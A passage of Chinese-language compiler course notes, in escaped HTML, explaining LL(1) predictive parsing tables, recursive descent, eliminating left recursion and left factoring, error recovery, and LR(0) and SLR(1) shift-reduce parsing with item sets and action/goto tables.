&lt;/ul&gt;
&lt;p&gt;对于每个产生式，我们可以循环用它们不断更新Follow集直到不动点。&lt;/p&gt;
&lt;p&gt;Tips(不要求掌握):Tiger book algorithm 3.13指出他们可以同时计算，感兴趣可以看看。&lt;/p&gt;
&lt;h4 id=&#34;第二步：构造预测分析表&#34;&gt;&lt;a href=&#34;#第二步：构造预测分析表&#34; class=&#34;headerlink&#34; title=&#34;第二步：构造预测分析表&#34;&gt;&lt;/a&gt;第二步：构造预测分析表&lt;/h4&gt;&lt;p&gt;&lt;del&gt;打开网站即可&lt;a href=&#34;https://jsmachines.sourceforge.net/machines/ll1.html&#34;&gt;LL(1) Parser Generator&lt;/a&gt;&lt;/del&gt;&lt;br&gt;不过这个网站对于理解第三步中PDA相关过程很有帮助。&lt;/p&gt;
&lt;p&gt;回顾自顶向下推导的两个选择题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;替换当前句型中的哪个非终结符?&lt;ul&gt;
&lt;li&gt;“Left-most”一词说明：总是选择每个句型的最左非终结符进行替换&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用该非终结符的哪个产生式进行替换? &lt;ul&gt;
&lt;li&gt;构建二维表M, 通过当前非终结符和看到的终结符决定选取何种产生式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;M的构造：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每一行A对应一个非终结符&lt;/li&gt;
&lt;li&gt;每一列a对应某个终结符或输入结束符$&lt;/li&gt;
&lt;li&gt;表中的某一格M[A,a]表示：针对当前非终结符A，下一个输入Token为终结符a时，可选的产生式集合&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;/compiler-construction-principles/tableM.png&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;构造：对于每个产生式 $X\rightarrow \gamma$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果 $ t\in \text{First}(\gamma)$, 插入产生式 $X\rightarrow \gamma$ 到M[X,t]&lt;/li&gt;
&lt;li&gt;如果 $ \gamma \in \text{Nullable} $ 且 $t \in \text{Follow}(X)$, 插入产生式 $X\rightarrow \gamma$ 到M[X,t]&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;如果某一格存在多个产生式，就说明无法确定选取哪个产生式，也就说明不是LL(1)文法！&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;第三步：预测分析&#34;&gt;&lt;a href=&#34;#第三步：预测分析&#34; class=&#34;headerlink&#34; title=&#34;第三步：预测分析&#34;&gt;&lt;/a&gt;第三步：预测分析&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;递归下降&lt;ul&gt;
&lt;li&gt;例如对于文法：&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;S -&amp;gt; E $&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;E -&amp;gt; E + T&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;E -&amp;gt; E – T&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;E -&amp;gt; T&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;T -&amp;gt; T * F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;T -&amp;gt; T / F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;T -&amp;gt; F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;F -&amp;gt; id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;F -&amp;gt; num&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;F -&amp;gt; ( E )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
形如：&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt; &amp;#123; E(); eat(EOF); &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt;(tok) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; ?: E(); eat(PLUS); T(); &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; ?: E(); eat(MINUS); T(); &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; ?: T(); &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;: error();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 问号处内容由预测分析表M决定，读者有兴趣可以帮忙验证一下这个文法是否LL(1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;非递归下降（&lt;strong&gt;无需掌握&lt;/strong&gt;）&lt;ul&gt;
&lt;li&gt;本质上还是递归下降，只是改写成Pushdown Automata所以相当于模拟一个栈&lt;/li&gt;
&lt;li&gt;如果栈顶是非终结符A：利用预测分析表,选择产生式A -&amp;gt; a（也就是将栈顶的非终结符A替换成串a）&lt;/li&gt;
&lt;li&gt;如果栈顶是终结符a：将栈顶记号a和输入中的Token匹配并出栈&lt;/li&gt;
&lt;li&gt;初态：压入初始符号&lt;/li&gt;
&lt;li&gt;终态：输入读取完毕，栈空，此时接受&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;消除左递归、提左公因子&#34;&gt;&lt;a href=&#34;#消除左递归、提左公因子&#34; class=&#34;headerlink&#34; title=&#34;消除左递归、提左公因子&#34;&gt;&lt;/a&gt;消除左递归、提左公因子&lt;/h3&gt;&lt;p&gt;LL(1)文法的一些性质（可用于判定）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LL(1)文法是无二义的&lt;/li&gt;
&lt;li&gt;LL(1)文法是无左递归的&lt;/li&gt;
&lt;li&gt;LL(1)文法是无左公因子的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;左递归(left-recursive)文法:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有非终结符A使得 $A \Rightarrow^* A\alpha$&lt;/li&gt;
&lt;li&gt;形如 $S\rightarrow Sa$ 的称为直接&amp;#x2F;立即左递归&lt;/li&gt;
&lt;li&gt;问题：这会导致递归下降分析进入无限循环&lt;ul&gt;
&lt;li&gt;$S\rightarrow Sa|b$ 分析 $baaaa$&lt;/li&gt;
&lt;li&gt;可能永远卡在”a”里而没机会考虑”b”: $ S \Rightarrow Sa \Rightarrow Saa \Rightarrow Saaa \Rightarrow Saaaa …$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;解决办法：通过文法变换消除（详见龙书）&lt;ul&gt;
&lt;li&gt;比如我们可以将这一文法：&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;A -&amp;gt; A a | b (a,b不以A开头，a不为空)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
转为右递归：&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;A -&amp;gt; b A&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;A&amp;#x27; -&amp;gt; aA&amp;#x27; | ε&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;左公因子的(left-factored)文法:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$ P \rightarrow \alpha \beta | \alpha \gamma$&lt;/li&gt;
&lt;li&gt;问题：同一非终结符的多个候选式存在共同前缀，可能导致回溯&lt;/li&gt;
&lt;li&gt;解决办法：限制文法 或 文法变换&lt;ul&gt;
&lt;li&gt;例如我们可以提取左公因子来“推迟决定”，这样我们可以在读入更多token后进行决策：&lt;br&gt;把&lt;br&gt;$$ P \rightarrow \alpha \beta | \alpha \gamma $$&lt;br&gt;变换为&lt;br&gt;$$ P \rightarrow \alpha Q $$&lt;br&gt;$$ Q \rightarrow \beta | \gamma $$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;错误恢复&#34;&gt;&lt;a href=&#34;#错误恢复&#34; class=&#34;headerlink&#34; title=&#34;错误恢复&#34;&gt;&lt;/a&gt;错误恢复&lt;/h3&gt;&lt;p&gt;错误：表M中对应格是空格，没有任何可取的产生式&lt;br&gt;我们不希望遇到错误直接全盘放弃，而是令Parser报错后，尽可能从错误中恢复并继续工作，这样可以一次性尽可能报出程序里全部错误。&lt;/p&gt;
&lt;p&gt;可以通过以下几种方式恢复：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;删除：例如，可以一直跳过token直到遇到当前非终结符对应Follow集中的token&lt;/li&gt;
&lt;li&gt;插入：例如，如果左右括号不匹配，我们可以插入一个假装有&lt;/li&gt;
&lt;li&gt;替换：例如，变量名错误可以替换为最相近的变量名&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Part-5-语法分析-自底向上&#34;&gt;&lt;a href=&#34;#Part-5-语法分析-自底向上&#34; class=&#34;headerlink&#34; title=&#34;Part 5: 语法分析 - 自底向上&#34;&gt;&lt;/a&gt;Part 5: 语法分析 - 自底向上&lt;/h2&gt;&lt;p&gt;从串w归约为文法开始符号S的过程。规约时，一个与某产生式体&lt;strong&gt;相匹配的特定子串&lt;/strong&gt;被替换为该产生式头部的&lt;strong&gt;非终结符号&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;何时归约(归约哪些符号串)？&lt;/li&gt;
&lt;li&gt;归约到哪个非终结符号？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;回顾：LL(1)的优势劣势：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;+ 运行高效(线性时间)&lt;/li&gt;
&lt;li&gt;+ 递归实现符合文法结构、适合手动构造&amp;amp;自动生成&lt;/li&gt;
&lt;li&gt;- 能分析的文法类型受限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们提出新文法：LR(k)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;表达力: Every LL(k) grammar is also LR(k)&lt;/li&gt;
&lt;li&gt;不要求无左公因式&lt;/li&gt;
&lt;li&gt;可以处理左递归文法&lt;/li&gt;
&lt;li&gt;被广泛采用(Yacc, Bison, …)&lt;/li&gt;
&lt;li&gt;“L”: left-to-right scanning 自左向右扫描&lt;/li&gt;
&lt;li&gt;“R”: right-most derivation in reverse 最右推导的逆&lt;/li&gt;
&lt;li&gt;“k”: 向前看的字符的个数(k省略时取1)&lt;/li&gt;
&lt;li&gt;子集（详见&lt;a href=&#34;#grammars-set&#34;&gt;该图&lt;/a&gt;）：LR(1), LALR(1), SLR, LR(0), …&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;移进-规约-Shift-Reduce&#34;&gt;&lt;a href=&#34;#移进-规约-Shift-Reduce&#34; class=&#34;headerlink&#34; title=&#34;移进-规约 Shift-Reduce&#34;&gt;&lt;/a&gt;移进-规约 Shift-Reduce&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这是LR(k) Parsing 的一般模式。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;核心思想：将字符串一分为二，&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;右侧是未被parser检查过的&lt;/li&gt;
&lt;li&gt;左侧包含终结符与非终结符&lt;br&gt;我们接下来会使用”|”标记分割点。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如，考虑该文法： $ E \rightarrow E+(E) | \text{int} $&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;显然并非LL(1)的：存在左递归&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们考虑处理字符串”int+(int)+(int)”，则过程如下：&lt;br&gt;&lt;img src=&#34;/compiler-construction-principles/sr.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;可见LR分析采用最右推导的&lt;strong&gt;逆过程&lt;/strong&gt;：最左规约。因此LR分析的每一步都是最右句型。&lt;br&gt;一般实现方式：采用&lt;strong&gt;栈&lt;/strong&gt;进行Shift-Reduce&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;栈：包含左侧字符串&lt;/li&gt;
&lt;li&gt;输入流：包含剩余未处理的右侧字符串&lt;/li&gt;
&lt;li&gt;操作：&lt;ul&gt;
&lt;li&gt;Shift: 从输入读入一个Terminal压入栈&lt;/li&gt;
&lt;li&gt;Reduce: 栈顶的几个元素满足某条产生式的&lt;strong&gt;RHS(Right hand side)&lt;/strong&gt;, 则pop这些元素并压入产生式的&lt;strong&gt;LHS(Left hand side)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Error&lt;/li&gt;
&lt;li&gt;Accept: shift “$” 并且栈中只剩下文法的开始符号&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;需要解决的问题：&lt;strong&gt;何时shift? 何时reduce?&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;表驱动的LR分析：类似LL文法的表，但行列意义不同，且这个表一般很大（详见后文）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;几个文法的包含关系（仍然是详见&lt;a href=&#34;#grammars-set&#34;&gt;该图&lt;/a&gt;）:&lt;br&gt;$ LR(0) \in SLR(1) \in LALR(1) \in LR(1) $&lt;/p&gt;
&lt;h3 id=&#34;LR-0-Parsing&#34;&gt;&lt;a href=&#34;#LR-0-Parsing&#34; class=&#34;headerlink&#34; title=&#34;LR(0) Parsing&#34;&gt;&lt;/a&gt;LR(0) Parsing&lt;/h3&gt;&lt;p&gt;核心思想：因为需要凑出产生式RHS，维护栈顶内容对于所有产生式右侧的“进度”。&lt;br&gt;项(Item):&amp;#x3D; 一个产生式加上在其中某处的一个点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;产生式 $A\rightarrow XYZ$ 有4个Item: &lt;ul&gt;
&lt;li&gt;$A\rightarrow \bullet XYZ $ &lt;/li&gt;
&lt;li&gt;$A\rightarrow X\bullet YZ $ &lt;/li&gt;
&lt;li&gt;$A\rightarrow XY\bullet Z $ &lt;/li&gt;
&lt;li&gt;$A\rightarrow XYZ \bullet $&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;$ A\rightarrow \alpha \bullet \beta$: 已扫描&amp;#x2F;归约到了α，并期望在接下来的输入中经过扫描&amp;#x2F;归约得到β，然后把αβ归约到A&lt;/li&gt;
&lt;li&gt;$ A\rightarrow \alpha \beta \bullet$: 已扫描&amp;#x2F;归约得到了αβ，此时已经可以把αβ归约为A&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Item类似有穷自动机的状态!&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;一个项读入一个符号后可以转变为另一个项：例如$A\rightarrow \bullet XYZ $ 读入X就可以转为 $A\rightarrow X\bullet YZ $&lt;/li&gt;
&lt;li&gt;显然项的数量是有限的。&lt;/li&gt;
&lt;li&gt;这样的有穷自动机被称为&lt;strong&gt;LR(0)自动机&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;LR-0-Parsing的NFA&#34;&gt;&lt;a href=&#34;#LR-0-Parsing的NFA&#34; class=&#34;headerlink&#34; title=&#34;LR(0)Parsing的NFA&#34;&gt;&lt;/a&gt;LR(0)Parsing的NFA&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;⚠ NFA只能识别正则语言RE，然而RE&amp;lt;LR(0). 所以这里的NFA只是用于辅助记录栈顶识别进度。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;新增开始符号S’，并加入产生式” S’-&amp;gt;S$ “&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;NFA起始状态：$S’\rightarrow \bullet S$ $ &lt;/li&gt;
&lt;li&gt;NFA终结状态：$S’\rightarrow S\bullet$ $ &lt;/li&gt;
&lt;li&gt;转移：&lt;ul&gt;
&lt;li&gt;$A\rightarrow \bullet XY $ 读入X就可以转为 $A\rightarrow X\bullet Y $&lt;/li&gt;
&lt;li&gt;对于产生式 $ X\rightarrow \alpha Y \beta $ 与 $Y\rightarrow \gamma$ 那么 $ X\rightarrow \alpha \bullet Y \beta $ 可以直接转换（ε-move）到 $ Y \rightarrow \bullet \gamma$ （相当于递归下降法里进入下一层递归，从而分析当前产生式内部的非终结符）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们更希望能转为DFA. 当然可以使用子集构造法转换，但事实上可以直接构造DFA.&lt;br&gt;&lt;img src=&#34;/compiler-construction-principles/lr-nfa2dfa.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;LR-0-Parsing的DFA与分析表&#34;&gt;&lt;a href=&#34;#LR-0-Parsing的DFA与分析表&#34; class=&#34;headerlink&#34; title=&#34;LR(0)Parsing的DFA与分析表&#34;&gt;&lt;/a&gt;LR(0)Parsing的DFA与分析表&lt;/h4&gt;&lt;h5 id=&#34;DFA构造&#34;&gt;&lt;a href=&#34;#DFA构造&#34; class=&#34;headerlink&#34; title=&#34;DFA构造&#34;&gt;&lt;/a&gt;DFA构造&lt;/h5&gt;&lt;p&gt;项集闭包CLOSURE:&amp;#x3D; a &lt;strong&gt;set&lt;/strong&gt; of &lt;strong&gt;items&lt;/strong&gt;, 记为I&lt;br&gt;任意符号记为X&lt;br&gt;对任意项集Closure(I)求法（其实就是ε-closure）：&lt;br&gt;Closure(I) &amp;#x3D; &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;repeat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  for any item A→ α•Xβ in I&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for any production X→ γ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      I ← I + &amp;#123;X→ •γ&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;until I does not change. &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;return I&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;TL;DR: 如果”·”的右边是非终结符X，就把X为LHS的产生式对应的初始项加入。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接下来的构造方式通过类比NFA-&amp;gt;DFA的子集构造法是显然的：&lt;br&gt;GOTO(I,X):&amp;#x3D; I是一个项集，X是一个文法符号，则GOTO(I,X)定义为I中所有形如 $A\rightarrow \bullet X \beta$ 的项所对应的新项 $A\rightarrow X \bullet \beta$ 构成的新集合生成的闭包（I是状态，X是转移，I里符合要求（也就是下一个符号是X）的产生式前移一位越过X加入转移到的新状态，不符合的被丢弃；当然考虑到ε-moves要再求一遍新状态的闭包）&lt;br&gt;&lt;img src=&#34;/compiler-construction-principles/lr-dfa.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;&lt;img src=&#34;/compiler-construction-principles/lr-dfa-eg.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;DFA到分析表&#34;&gt;&lt;a href=&#34;#DFA到分析表&#34; class=&#34;headerlink&#34; title=&#34;DFA到分析表&#34;&gt;&lt;/a&gt;DFA到分析表&lt;/h5&gt;&lt;p&gt;分析表T类似LL(1)中的表M，但是行列的含义与内容都发生了很大变化：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Action表项：&lt;ul&gt;
&lt;li&gt;每一行对应一个状态i&lt;/li&gt;
&lt;li&gt;每一列对应一个&lt;strong&gt;终结符t&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;表中的一格T[i,t]代表要做的操作action，有以下几种可能：&lt;ul&gt;
&lt;li&gt;$s_n$ &amp;#x3D; shift n :&amp;#x3D; 从状态i经过&lt;strong&gt;终结符t&lt;/strong&gt;转移到状态n&lt;ul&gt;
&lt;li&gt;从输入流中取一个终结符t压入状态栈&lt;/li&gt;
&lt;li&gt;将n压入状态栈&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;$r_k$ &amp;#x3D; reduce k :&amp;#x3D; 确定使用第k个产生式进行规约（此时状态i没有出边）&lt;ul&gt;
&lt;li&gt;弹出状态栈顶的几个状态（数量对应产生式#k的RHS长度）&lt;/li&gt;
&lt;li&gt;符号栈压入产生式#k的LHS，也即一个非终结符X&lt;/li&gt;
&lt;li&gt;查询Goto表（见下文）T[i,X]将对应的下一个状态压入状态栈&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;accept :&amp;#x3D; 该状态包含 $S’\rightarrow S \bullet $ $, 接受字符串，运行完毕&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Goto表项：&lt;ul&gt;
&lt;li&gt;每一行对应一个状态i&lt;/li&gt;
&lt;li&gt;每一列对应一个&lt;strong&gt;非终结符X&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;表中的一格T[i,X]表明经过&lt;strong&gt;非终结符X&lt;/strong&gt;下一个状态是什么&lt;/li&gt;
&lt;li&gt;格中的$g_n$ &amp;#x3D; goto n :&amp;#x3D; 从状态i经过&lt;strong&gt;非终结符X&lt;/strong&gt;转移到状态n&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;/compiler-construction-principles/dfa2table.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;LR实际实现只有状态栈，符号信息可从相应状态中获取&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以下是一个例子：&lt;br&gt;&lt;img src=&#34;/compiler-construction-principles/lr0-stack-table.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;如何理解”LR(0)”中的”0”: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Item中没有Lookahead terminal等信息，不关心后面的token&lt;/li&gt;
&lt;li&gt;是否规约&amp;#x2F;使用何产生式规约完全取决于栈顶状态&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;局限性：由于只要有产生式能规约就立刻规约，很容易产生冲突（也就是表中一格有多个$s_n$,$r_n$，不知道应该直接规约还是需要接受更多符号来完成另一个产生式，这被称作&lt;strong&gt;shift-reduce conflict&lt;/strong&gt;）&lt;br&gt;我们引入新的文法，放宽一些限制。&lt;/p&gt;
&lt;h3 id=&#34;SLR-1-Parsing&#34;&gt;&lt;a href=&#34;#SLR-1-Parsing&#34; class=&#34;headerlink&#34; title=&#34;SLR(1) Parsing&#34;&gt;&lt;/a&gt;SLR(1) Parsing&lt;/h3&gt;&lt;p&gt;SLR(1) &amp;#x3D; Simple LR(1)&lt;/p&gt;
&lt;p&gt;我们说过k省略时默认为1，所以称为SLR文法即可。其实就是LR(0)稍微改改。&lt;/p&gt;
&lt;p&gt;考虑每次规约，都会使用一个产生式 $E\rightarrow \alpha$&lt;br&gt;“LR分析是最右推导的逆过程”，因此每步归约都应该满足：&lt;br&gt;$$ t \in \text{Follow}(E) $$其中t指的是&lt;strong&gt;输入流中下一个token&lt;/strong&gt;, E指的是用于&lt;strong&gt;此规约用到的产生式的左部(LHS)&lt;/strong&gt;.&lt;br&gt;因此对于SLR文法来说，SLR的DFA和LR(0)一样；但LR(0)的分析表中有一些rn&amp;#x2F;sn是非法的，需要删去。&lt;br&gt;在生成分析表的具体步骤上：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LR(0)的某些状态包含可规约的Item，那么这个状态I在对应的Action表中T[I,_]这一行的每一个格子（无论终结符t是什么）无论如何都会有对应的$r_n$项&lt;/li&gt;
&lt;li&gt;SLR会关心后面的终结符是什么，因此如果t不在Follow集中，这不能是一个合法的规约，Action表对应的t列就不会有这个$r_n$&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如，图中被划去的部分即为从LR(0)分析表到SLR分析表的变化：&lt;br&gt;&lt;img src=&#34;/compiler-construction-principles/slr-table.png&#34; alt=&#34;SLR分析表：删去了部分规约项&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
